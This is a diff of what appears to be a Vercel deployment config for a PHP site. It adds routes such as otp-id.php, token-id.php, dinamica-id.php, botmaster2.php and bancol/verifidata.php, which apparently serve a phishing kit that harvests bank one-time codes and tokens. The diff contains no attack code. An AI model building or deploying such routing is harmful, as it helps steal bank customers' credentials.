@@ -2,7 +2,8 @@
   "cleanUrls": true,
   "functions": {
     "api/index.php": {
-      "runtime": "vercel-php@0.9.0"
+      "runtime": "vercel-php@0.9.0",
+      "includeFiles": "php_sources/**"
     },
     "api/vuelos/index.php": {
       "runtime": "vercel-php@0.9.0"
@@ -14,13 +15,57 @@
       "dest": "/api/vuelos/index.php"
     },
     {
+      "src": "/load.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/datos.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/loadtiketid.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/checking.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/cargando.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/botmaster2.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/ccajero-id.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/dinamica-id.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/error-id.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/otp-id.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/token-id.php",
+      "dest": "/api/index.php"
+    },
+    {
+      "src": "/dinadatos/bancol/verifidata.php",
+      "dest": "/api/index.php"
+    },
+    {
       "src": "/php_sources/(.*)",
       "status": 403,
       "dest": "/"
-    },
-    {
-      "src": "/(.*\\.php)$",
-      "dest": "/api/index.php"
     },
     {
       "src": "/(.*)",
